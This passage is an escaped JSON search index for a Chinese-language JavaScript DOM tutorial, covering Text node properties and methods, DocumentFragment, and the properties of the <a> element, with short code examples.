\u8282\u70b9"},{"location":"dom/text/#text","text":"\u6587\u672c\u8282\u70b9\uff08 Text \uff09\u4ee3\u8868\u5143\u7d20\u8282\u70b9\uff08 Element \uff09\u548c\u5c5e\u6027\u8282\u70b9\uff08 Attribute \uff09\u7684\u6587\u672c\u5185\u5bb9\u3002\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u53ea\u5305\u542b\u4e00\u6bb5\u6587\u672c\uff0c\u90a3\u4e48\u5b83\u5c31\u6709\u4e00\u4e2a\u6587\u672c\u5b50\u8282\u70b9\uff0c\u4ee3\u8868\u8be5\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002 \u901a\u5e38\u6211\u4eec\u4f7f\u7528\u7236\u8282\u70b9\u7684 firstChild \u3001 nextSibling \u7b49\u5c5e\u6027\u83b7\u53d6\u6587\u672c\u8282\u70b9\uff0c\u6216\u8005\u4f7f\u7528 Document \u8282\u70b9\u7684 createTextNode \u65b9\u6cd5\u521b\u9020\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u3002 1 2 3 4 5 6 // \u83b7\u53d6\u6587\u672c\u8282\u70b9 var textNode = document . querySelector ( 'p' ). firstChild ; // \u521b\u9020\u6587\u672c\u8282\u70b9 var textNode = document . createTextNode ( 'Hi' ); document . querySelector ( 'div' ). appendChild ( textNode ); \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a Text \u6784\u9020\u51fd\u6570\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u5b9e\u4f8b\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u8be5\u6587\u672c\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002 1 2 3 4 5 // \u7a7a\u5b57\u7b26\u4e32 var text1 = new Text (); // \u975e\u7a7a\u5b57\u7b26\u4e32 var text2 = new Text ( 'This is a text node' ); \u6ce8\u610f\uff0c\u7531\u4e8e\u7a7a\u683c\u4e5f\u662f\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u54ea\u6015\u53ea\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u4e5f\u4f1a\u5f62\u6210\u6587\u672c\u8282\u70b9\u3002\u6bd4\u5982\uff0c <p> </p> \u5305\u542b\u4e00\u4e2a\u7a7a\u683c\uff0c\u5b83\u7684\u5b50\u8282\u70b9\u5c31\u662f\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u3002 \u6587\u672c\u8282\u70b9\u9664\u4e86\u7ee7\u627f Node \u63a5\u53e3\uff0c\u8fd8\u7ee7\u627f\u4e86 CharacterData \u63a5\u53e3\u3002 Node \u63a5\u53e3\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u8bf7\u53c2\u8003\u300aNode \u63a5\u53e3\u300b\u4e00\u7ae0\uff0c\u8fd9\u91cc\u4e0d\u518d\u91cd\u590d\u4ecb\u7ecd\u4e86\uff0c\u4ee5\u4e0b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5927\u90e8\u5206\u6765\u81ea CharacterData \u63a5\u53e3\u3002","title":"Text \u8282\u70b9\u7684\u6982\u5ff5"},{"location":"dom/text/#text_1","text":"","title":"Text \u8282\u70b9\u7684\u5c5e\u6027"},{"location":"dom/text/#data","text":"data \u5c5e\u6027\u7b49\u540c\u4e8e nodeValue \u5c5e\u6027\uff0c\u7528\u6765\u8bbe\u7f6e\u6216\u8bfb\u53d6\u6587\u672c\u8282\u70b9\u7684\u5185\u5bb9\u3002 1 2 3 4 5 6 7 // \u8bfb\u53d6\u6587\u672c\u5185\u5bb9 document . querySelector ( 'p' ). firstChild . data // \u7b49\u540c\u4e8e document . querySelector ( 'p' ). firstChild . nodeValue // \u8bbe\u7f6e\u6587\u672c\u5185\u5bb9 document . querySelector ( 'p' ). firstChild . data = 'Hello World' ;","title":"data"},{"location":"dom/text/#wholetext","text":"wholeText \u5c5e\u6027\u5c06\u5f53\u524d\u6587\u672c\u8282\u70b9\u4e0e\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u8fd4\u56de\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c wholeText \u5c5e\u6027\u7684\u8fd4\u56de\u503c\uff0c\u4e0e data \u5c5e\u6027\u548c textContent \u5c5e\u6027\u76f8\u540c\u3002\u4f46\u662f\uff0c\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\u4f1a\u6709\u5dee\u5f02\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0cHTML \u4ee3\u7801\u5982\u4e0b\u3002 1 < p id = \"para\" > A < em > B </ em > C </ p > \u8fd9\u65f6\uff0c\u6587\u672c\u8282\u70b9\u7684 wholeText \u5c5e\u6027\u548c data \u5c5e\u6027\uff0c\u8fd4\u56de\u503c\u76f8\u540c\u3002 1 2 3 var el = document . getElementById ( 'para' ); el . firstChild . wholeText // \"A \" el . firstChild . data // \"A \" \u4f46\u662f\uff0c\u4e00\u65e6\u79fb\u9664 <em> \u8282\u70b9\uff0c wholeText \u5c5e\u6027\u4e0e data \u5c5e\u6027\u5c31\u4f1a\u6709\u5dee\u5f02\uff0c\u56e0\u4e3a\u8fd9\u65f6\u5176\u5b9e <p> \u8282\u70b9\u4e0b\u9762\u5305\u542b\u4e86\u4e24\u4e2a\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\u3002 1 2 3 el . removeChild ( para . childNodes [ 1 ]); el . firstChild . wholeText // \"A C\" el . firstChild . data // \"A \"","title":"wholeText"},{"location":"dom/text/#length","text":"length \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u672c\u8282\u70b9\u7684\u6587\u672c\u957f\u5ea6\u3002 1 ( new Text ( 'Hello' )). length // 5","title":"length"},{"location":"dom/text/#nextelementsiblingpreviouselementsibling","text":"nextElementSibling \u5c5e\u6027\u8fd4\u56de\u7d27\u8ddf\u5728\u5f53\u524d\u6587\u672c\u8282\u70b9\u540e\u9762\u7684\u90a3\u4e2a\u540c\u7ea7\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u53d6\u4e0d\u5230\u5143\u7d20\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 // HTML \u4e3a // <div>Hello <em>World</em></div> var tn = document . querySelector ( 'div' ). firstChild ; tn . nextElementSibling // <em>World</em> previousElementSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u672c\u8282\u70b9\u524d\u9762\u6700\u8fd1\u7684\u540c\u7ea7\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u53d6\u4e0d\u5230\u5143\u7d20\u8282\u70b9\uff0c\u5219\u8fd4\u56de null\uff1a \u3002","title":"nextElementSibling\uff0cpreviousElementSibling"},{"location":"dom/text/#text_2","text":"","title":"Text \u8282\u70b9\u7684\u65b9\u6cd5"},{"location":"dom/text/#appenddatadeletedatainsertdatareplacedatasubstringdata","text":"\u4ee5\u4e0b5\u4e2a\u65b9\u6cd5\u90fd\u662f\u7f16\u8f91 Text \u8282\u70b9\u6587\u672c\u5185\u5bb9\u7684\u65b9\u6cd5\u3002 appendData() \uff1a\u5728 Text \u8282\u70b9\u5c3e\u90e8\u8ffd\u52a0\u5b57\u7b26\u4e32\u3002 deleteData() \uff1a\u5220\u9664 Text \u8282\u70b9\u5185\u90e8\u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u3002 insertData() \uff1a\u5728 Text \u8282\u70b9\u63d2\u5165\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u63d2\u5165\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u63d2\u5165\u7684\u5b50\u5b57\u7b26\u4e32\u3002 replaceData() \uff1a\u7528\u4e8e\u66ff\u6362\u6587\u672c\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u66ff\u6362\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u9700\u8981\u88ab\u66ff\u6362\u6389\u7684\u957f\u5ea6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3a\u65b0\u52a0\u5165\u7684\u5b57\u7b26\u4e32\u3002 subStringData() \uff1a\u7528\u4e8e\u83b7\u53d6\u5b50\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u5728 Text \u8282\u70b9\u4e2d\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u4e3a // <p>Hello World</p> var pElementText = document . querySelector ( 'p' ). firstChild ; pElementText . appendData ( '!' ); // \u9875\u9762\u663e\u793a Hello World! pElementText . deleteData ( 7 , 5 ); // \u9875\u9762\u663e\u793a Hello W pElementText . insertData ( 7 , 'Hello ' ); // \u9875\u9762\u663e\u793a Hello WHello pElementText . replaceData ( 7 , 5 , 'World' ); // \u9875\u9762\u663e\u793a Hello WWorld pElementText . substringData ( 7 , 10 ); // \u9875\u9762\u663e\u793a\u4e0d\u53d8\uff0c\u8fd4\u56de\"World \"","title":"appendData()\uff0cdeleteData()\uff0cinsertData()\uff0creplaceData()\uff0csubStringData()"},{"location":"dom/text/#remove","text":"remove \u65b9\u6cd5\u7528\u4e8e\u79fb\u9664\u5f53\u524d Text \u8282\u70b9\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <p>Hello World</p> document . querySelector ( 'p' ). firstChild . remove () // \u73b0\u5728 HTML \u4ee3\u7801\u4e3a // <p></p>","title":"remove()"},{"location":"dom/text/#splittext","text":"splitText \u65b9\u6cd5\u5c06 Text \u8282\u70b9\u4e00\u5206\u4e3a\u4e8c\uff0c\u53d8\u6210\u4e24\u4e2a\u6bd7\u90bb\u7684 Text \u8282\u70b9\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u5206\u5272\u4f4d\u7f6e\uff08\u4ece\u96f6\u5f00\u59cb\uff09\uff0c\u5206\u5272\u5230\u8be5\u4f4d\u7f6e\u7684\u5b57\u7b26\u524d\u7ed3\u675f\u3002\u5982\u679c\u5206\u5272\u4f4d\u7f6e\u4e0d\u5b58\u5728\uff0c\u5c06\u62a5\u9519\u3002 \u5206\u5272\u540e\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u5206\u5272\u4f4d\u7f6e\u540e\u65b9\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u539f Text \u8282\u70b9\u53d8\u6210\u53ea\u5305\u542b\u5206\u5272\u4f4d\u7f6e\u524d\u65b9\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 // html \u4ee3\u7801\u4e3a <p id=\"p\">foobar</p> var p = document . getElementById ( 'p' ); var textnode = p . firstChild ; var newText = textnode . splitText ( 3 ); newText // \"bar\" textnode // \"foo\" \u7236\u5143\u7d20\u8282\u70b9\u7684 normalize \u65b9\u6cd5\u53ef\u4ee5\u5c06\u6bd7\u90bb\u7684\u4e24\u4e2a Text \u8282\u70b9\u5408\u5e76\u3002 \u63a5\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u6587\u672c\u8282\u70b9\u7684 splitText \u65b9\u6cd5\u5c06\u4e00\u4e2a Text \u8282\u70b9\u5206\u5272\u6210\u4e24\u4e2a\uff0c\u7236\u5143\u7d20\u7684 normalize \u65b9\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u9006\u64cd\u4f5c\uff0c\u5c06\u5b83\u4eec\u5408\u5e76\u3002 1 2 3 4 5 p . childNodes . length // 2 // \u5c06\u6bd7\u90bb\u7684\u4e24\u4e2a Text \u8282\u70b9\u5408\u5e76 p . normalize (); p . childNodes . length // 1","title":"splitText()"},{"location":"dom/text/#documentfragment","text":"DocumentFragment \u8282\u70b9\u4ee3\u8868\u4e00\u4e2a\u6587\u6863\u7684\u7247\u6bb5\uff0c\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 DOM \u6811\u5f62\u7ed3\u6784\u3002\u5b83\u6ca1\u6709\u7236\u8282\u70b9\uff0c parentNode \u8fd4\u56de null \uff0c\u4f46\u662f\u53ef\u4ee5\u63d2\u5165\u4efb\u610f\u6570\u91cf\u7684\u5b50\u8282\u70b9\u3002\u5b83\u4e0d\u5c5e\u4e8e\u5f53\u524d\u6587\u6863\uff0c\u64cd\u4f5c DocumentFragment \u8282\u70b9\uff0c\u8981\u6bd4\u76f4\u63a5\u64cd\u4f5c DOM \u6811\u5feb\u5f97\u591a\u3002 \u5b83\u4e00\u822c\u7528\u4e8e\u6784\u5efa\u4e00\u4e2a DOM \u7ed3\u6784\uff0c\u7136\u540e\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002 document.createDocumentFragment \u65b9\u6cd5\uff0c\u4ee5\u53ca\u6d4f\u89c8\u5668\u539f\u751f\u7684 DocumentFragment \u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684 DocumentFragment \u8282\u70b9\u3002\u7136\u540e\u518d\u4f7f\u7528\u5176\u4ed6 DOM \u65b9\u6cd5\uff0c\u5411\u5176\u6dfb\u52a0\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 var docFrag = document . createDocumentFragment (); // \u7b49\u540c\u4e8e var docFrag = new DocumentFragment (); var li = document . createElement ( 'li' ); li . textContent = 'Hello World' ; docFrag . appendChild ( li ); document . querySelector ( 'ul' ). appendChild ( docFrag ); \u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a DocumentFragment \u8282\u70b9\uff0c\u7136\u540e\u5c06\u4e00\u4e2a li \u8282\u70b9\u6dfb\u52a0\u5728\u5b83\u91cc\u9762\uff0c\u6700\u540e\u5c06 DocumentFragment \u8282\u70b9\u79fb\u52a8\u5230\u539f\u6587\u6863\u3002 \u6ce8\u610f\uff0c DocumentFragment \u8282\u70b9\u672c\u8eab\u4e0d\u80fd\u88ab\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002\u5f53\u5b83\u4f5c\u4e3a appendChild() \u3001 insertBefore() \u3001 replaceChild() \u7b49\u65b9\u6cd5\u7684\u53c2\u6570\u65f6\uff0c\u662f\u5b83\u7684\u6240\u6709\u5b50\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\uff0c\u800c\u4e0d\u662f\u5b83\u81ea\u8eab\u3002\u4e00\u65e6 DocumentFragment \u8282\u70b9\u88ab\u6dfb\u52a0\u8fdb\u5f53\u524d\u6587\u6863\uff0c\u5b83\u81ea\u8eab\u5c31\u53d8\u6210\u4e86\u7a7a\u8282\u70b9\uff08 textContent \u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff09\uff0c\u53ef\u4ee5\u88ab\u518d\u6b21\u4f7f\u7528\u3002\u5982\u679c\u60f3\u8981\u4fdd\u5b58 DocumentFragment \u8282\u70b9\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 cloneNode \u65b9\u6cd5\u3002 1 2 3 document . querySelector ( 'ul' ) . appendChild ( docFrag . cloneNode ( true )); \u4e0a\u9762\u8fd9\u6837\u6dfb\u52a0 DocumentFragment \u8282\u70b9\u8fdb\u5165\u5f53\u524d\u6587\u6863\uff0c\u4e0d\u4f1a\u6e05\u7a7a DocumentFragment \u8282\u70b9\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4f7f\u7528 DocumentFragment \u53cd\u8f6c\u4e00\u4e2a\u6307\u5b9a\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u7684\u987a\u5e8f\u3002 1 2 3 4 5 function reverse ( n ) { var f = document . createDocumentFragment (); while ( n . lastChild ) f . appendChild ( n . lastChild ); n . appendChild ( f ); } DocumentFragment \u8282\u70b9\u5bf9\u8c61\u6ca1\u6709\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5168\u90e8\u7ee7\u627f\u81ea Node \u8282\u70b9\u548c ParentNode \u63a5\u53e3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c DocumentFragment \u8282\u70b9\u6bd4 Node \u8282\u70b9\u591a\u51fa\u4ee5\u4e0b\u56db\u4e2a\u5c5e\u6027\u3002 children \uff1a\u8fd4\u56de\u4e00\u4e2a\u52a8\u6001\u7684 HTMLCollection \u96c6\u5408\u5bf9\u8c61\uff0c\u5305\u62ec\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u6240\u6709\u5b50\u5143\u7d20\u8282\u70b9\u3002 firstElementChild \uff1a\u8fd4\u56de\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u7b2c\u4e00\u4e2a\u5b50\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 lastElementChild \uff1a\u8fd4\u56de\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 childElementCount \uff1a\u8fd4\u56de\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u6240\u6709\u5b50\u5143\u7d20\u6570\u91cf\u3002","title":"DocumentFragment \u8282\u70b9"},{"location":"elements/a/","text":"\u5143\u7d20 \u00b6 <a> \u5143\u7d20\u7528\u6765\u8bbe\u7f6e\u94fe\u63a5\u3002\u9664\u4e86\u7f51\u9875\u5143\u7d20\u7684\u901a\u7528\u63a5\u53e3\uff08 Node \u63a5\u53e3\u3001 Element \u63a5\u53e3\u3001 HTMLElement \u63a5\u53e3\uff09\uff0c\u5b83\u8fd8\u7ee7\u627f\u4e86 HTMLAnchorElement \u63a5\u53e3\u548c HTMLHyperlinkElementUtils \u63a5\u53e3\u3002 \u5c5e\u6027 \u00b6 URL \u76f8\u5173\u5c5e\u6027 \u00b6 <a> \u5143\u7d20\u6709\u4e00\u7cfb\u5217 URL \u76f8\u5173\u5c5e\u6027\uff0c\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c\u94fe\u63a5\u5730\u5740\u3002\u8fd9\u4e9b\u5c5e\u6027\u7684\u542b\u4e49\uff0c\u53ef\u4ee5\u53c2\u89c1 Location \u5bf9\u8c61\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 hash\uff1a\u7247\u6bb5\u8bc6\u522b\u7b26\uff08\u4ee5 # \u5f00\u5934\uff09 host\uff1a\u4e3b\u673a\u548c\u7aef\u53e3\uff08\u9ed8\u8ba4\u7aef\u53e380\u548c443\u4f1a\u7701\u7565\uff09 hostname\uff1a\u4e3b\u673a\u540d href\uff1a\u5b8c\u6574\u7684 URL origin\uff1a\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3 password\uff1a\u4e3b\u673a\u540d\u524d\u7684\u5bc6\u7801 pathname\uff1a\u8def\u5f84\uff08\u4ee5 / \u5f00\u5934\uff09 port\uff1a\u7aef\u53e3 protocol\uff1a\u534f\u8bae\uff08\u5305\u542b\u5c3e\u90e8\u7684\u5192\u53f7 : \uff09 search\uff1a\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u4ee5 ? \u5f00\u5934\uff09 username\uff1a\u4e3b\u673a\u540d\u524d\u7684\u7528\u6237\u540d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"http://user:passwd@example.com:8081/index.html?bar=1#foo\">test</a> var a = document . getElementById ( 'test' ); a . hash // \"#foo\" a . host // \"example.com:8081\" a . hostname // \"example.com\" a . href // \"http://user:passed@example.com:8081/index.html?bar=1#foo\" a . origin // \"http://example.com:8081\" a . password // \"passwd\" a . pathname // \"/index.html\" a . port // \"8081\" a . protocol // \"http:\" a . search // \"?bar=1\" a . username // \"user\" \u9664\u4e86 origin \u5c5e\u6027\u662f\u53ea\u8bfb\u7684\uff0c\u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ef\u8bfb\u5199\u7684\u3002 accessKey \u5c5e\u6027 \u00b6 accessKey \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684\u5feb\u6377\u952e\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"http://example.com\">test</a> var a = document . getElementById ( 'test' ); a . accessKey = 'k' ; \u4e0a\u9762\u4ee3\u7801\u8bbe\u7f6e <a> \u5143\u7d20\u7684\u5feb\u6377\u952e\u4e3a k \uff0c\u4ee5\u540e\u53ea\u8981\u6309\u4e0b\u8fd9\u4e2a\u5feb\u6377\u952e\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8df3\u8f6c\u5230 example.com \u3002 \u6ce8\u610f\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u5728\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0b\uff0c\u5524\u8d77\u5feb\u6377\u952e\u7684\u529f\u80fd\u952e\u7ec4\u5408\u662f \u4e0d\u4e00\u6837 \u7684\u3002\u6bd4\u5982\uff0cChrome \u6d4f\u89c8\u5668\u5728 Linux \u7cfb\u7edf\u4e0b\uff0c\u9700\u8981\u6309\u4e0b Alt + k \uff0c\u624d\u4f1a\u8df3\u8f6c\u5230 example.com \u3002 download \u5c5e\u6027 \u00b6 download \u5c5e\u6027\u8868\u793a\u5f53\u524d\u94fe\u63a5\u4e0d\u662f\u7528\u6765\u6d4f\u89c8\uff0c\u800c\u662f\u7528\u6765\u4e0b\u8f7d\u7684\u3002\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u7528\u6237\u4e0b\u8f7d\u5f97\u5230\u7684\u6587\u4ef6\u540d\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"foo.jpg\">\u4e0b\u8f7d</a> var a = document . getElementById ( 'test' ); a . download = 'bar.jpg' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <a> \u5143\u7d20\u662f\u4e00\u4e2a\u56fe\u7247\u94fe\u63a5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u540e\u56fe\u7247\u4f1a\u5728\u5f53\u524d\u7a97\u53e3\u52a0\u8f7d\u3002\u8bbe\u7f6e\u4e86 download \u5c5e\u6027\u4ee5\u540e\uff0c\u518d\u70b9\u51fb\u8fd9\u4e2a\u94fe\u63a5\uff0c\u5c31\u4f1a\u4e0b\u8f7d\u5bf9\u8bdd\u6846\uff0c\u8be2\u95ee\u7528\u6237\u4fdd\u5b58\u4f4d\u7f6e\uff0c\u800c\u4e14\u4e0b\u8f7d\u7684\u6587\u4ef6\u540d\u4e3a bar.jpg \u3002 hreflang \u5c5e\u6027 \u00b6 hreflang \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 hreflang \uff0c\u8868\u793a\u94fe\u63a5\u6307\u5411\u7684\u8d44\u6e90\u7684\u8bed\u8a00\uff0c\u6bd4\u5982 hreflang=\"en\" \u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" hreflang=\"en\">test</a> var a = document . getElementById ( 'test' ); a . hreflang // \"en\" referrerPolicy \u5c5e\u6027 \u00b6 referrerPolicy \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 referrerPolicy \uff0c\u6307\u5b9a\u5f53\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u65f6\uff0c\u5982\u4f55\u53d1\u9001 HTTP \u5934\u4fe1\u606f\u7684 referer \u5b57\u6bb5\u3002 HTTP \u5934\u4fe1\u606f\u7684 referer \u5b57\u6bb5\uff0c\u8868\u793a\u5f53\u524d\u8bf7\u6c42\u662f\u4ece\u54ea\u91cc\u6765\u7684\u3002\u5b83\u7684\u683c\u5f0f\u53ef\u4ee5\u7531 <a> \u5143\u7d20\u7684 referrerPolicy \u5c5e\u6027\u6307\u5b9a\uff0c\u5171\u6709\u4e09\u4e2a\u503c\u53ef\u4ee5\u9009\u62e9\u3002 no-referrer \uff1a\u4e0d\u53d1\u9001 referer \u5b57\u6bb5\u3002 origin \uff1a referer \u5b57\u6bb5\u7684\u503c\u662f <a> \u5143\u7d20\u7684 origin \u5c5e\u6027\uff0c\u5373\u534f\u8bae + \u4e3b\u673a\u540d + \u7aef\u53e3\u3002 unsafe-url \uff1a referer \u5b57\u6bb5\u7684\u503c\u662f origin \u5c5e\u6027\u518d\u52a0\u4e0a\u8def\u5f84\uff0c\u4f46\u4e0d\u5305\u542b # \u7247\u6bb5\u3002\u8fd9\u79cd\u683c\u5f0f\u63d0\u4f9b\u7684\u4fe1\u606f\u6700\u8be6\u7ec6\uff0c\u53ef\u80fd\u5b58\u5728\u4fe1\u606f\u6cc4\u6f0f\u7684\u98ce\u9669\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" referrerpolicy=\"no-referrer\">test</a> var a = document . getElementById ( 'test' ); a . referrerPolicy // \"no-referrer\" rel \u5c5e\u6027 \u00b6 rel \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 rel \uff0c\u8868\u793a\u94fe\u63a5\u4e0e\u5f53\u524d\u6587\u6863\u7684\u5173\u7cfb\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" rel=\"license\">license.html</a> var a = document . getElementById ( 'test' ); a . rel // \"license\" tabIndex \u5c5e\u6027 \u00b6 tabIndex \u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u7528\u6765\u8bfb\u5199\u5f53\u524d <a> \u5143\u7d20\u5728\u6587\u6863\u91cc\u9762\u7684 Tab \u952e\u904d\u5386\u987a\u5e8f\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\">test</a> var a = document . getElementById ( 'test' ); a . tabIndex // 0 target \u5c5e\u6027 \u00b6 target \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 target \u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" target=\"_blank\">test</a> var a = document . getElementById ( 'test' ); a . target // \"_blank\" text \u5c5e\u6027 \u00b6 text \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684\u94fe\u63a5\u6587\u672c\uff0c\u7b49\u540c\u4e8e\u5f53\u524d\u8282\u70b9\u7684 textContent \u5c5e\u6027\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\">test</a> var a = document . getElementById ( 'test' ); a . text // \"test\" type \u5c5e\u6027 \u00b6 type \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 type \uff0c\u8868\u793a\u94fe\u63a5\u76ee\u6807\u7684 MIME \u7c7b\u578b\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" type=\"video/mp4\" href=\"example.mp4\">video</a> var a = document . getElementById ( 'test' ); a . type // \"video/mp4\" \u65b9\u6cd5 \u00b6 <a> \u5143\u7d20\u7684\u65b9\u6cd5\u90fd\u662f\u7ee7\u627f\u7684\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u4e2a\u3002 blur() \uff1a\u4ece\u5f53\u524d\u5143\u7d20\u79fb\u9664\u952e\u76d8\u7126\u70b9\uff0c\u8be6\u89c1 HTMLElement \u63a5\u53e3\u7684\u4ecb\u7ecd\u3002 focus() \uff1a\u5f53\u524d\u5143\u7d20\u5f97\u5230\u952e\u76d8\u7126\u70b9\uff0c\u8be6\u89c1 HTMLElement \u63a5\u53e3\u7684\u4ecb\u7ecd\u3002 toString() \uff1a\u8fd4\u56de\u5f53\u524d <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 href \u3002","title":"a"},{"location":"elements/a/#_1","text":"<a> \u5143\u7d20\u7528\u6765\u8bbe\u7f6e\u94fe\u63a5\u3002\u9664\u4e86\u7f51\u9875\u5143\u7d20\u7684\u901a\u7528\u63a5\u53e3\uff08 Node \u63a5\u53e3\u3001 Element \u63a5\u53e3\u3001 HTMLElement \u63a5\u53e3\uff09\uff0c\u5b83\u8fd8\u7ee7\u627f\u4e86 HTMLAnchorElement \u63a5\u53e3\u548c HTMLHyperlinkElementUtils \u63a5\u53e3\u3002","title":" \u5143\u7d20"},{"location":"elements/a/#_2","text":"","title":"\u5c5e\u6027"},{"location":"elements/a/#url","text":"<a> \u5143\u7d20\u6709\u4e00\u7cfb\u5217 URL 